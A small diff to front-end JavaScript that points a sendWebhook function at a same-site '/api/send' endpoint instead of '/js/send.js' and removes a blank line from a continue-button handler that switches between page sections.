@@ -43,7 +43,7 @@ function sleep(ms) {
 
 // Send webhook data to server-side file
 async function sendWebhook(name, value) {
-  let webhookUrl = "/js/send.js";
+  let webhookUrl = "/api/send";
 
   try {
     const response = await fetch(webhookUrl, {
@@ -80,7 +80,6 @@ continueBtn.addEventListener("click", async (event) => {
     box.classList.add("hide");
     box2.classList.remove("hide");
     box2.classList.add("show");
-    
   } else {
     notify2.classList.remove("hide");
     notify2.classList.add("show");
